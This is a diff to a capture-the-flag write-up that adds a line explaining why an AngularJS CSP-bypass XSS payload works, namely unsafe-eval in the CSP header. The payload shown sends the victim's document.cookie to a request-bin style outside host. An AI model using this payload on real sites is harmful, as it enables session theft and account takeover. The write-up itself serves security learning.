@@ -20,3 +20,5 @@ To get the flag, we can use the following payload:
 ```html
 <script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script><div ng-app ng-csp id=p ng-click={{constructor.constructor("window.location.href='https://some.request.bin.site?cookie='+document.cookie")()}}>
 ```
+
+Note that this payload works because the unsafe-eval directive is present in the CSP header.
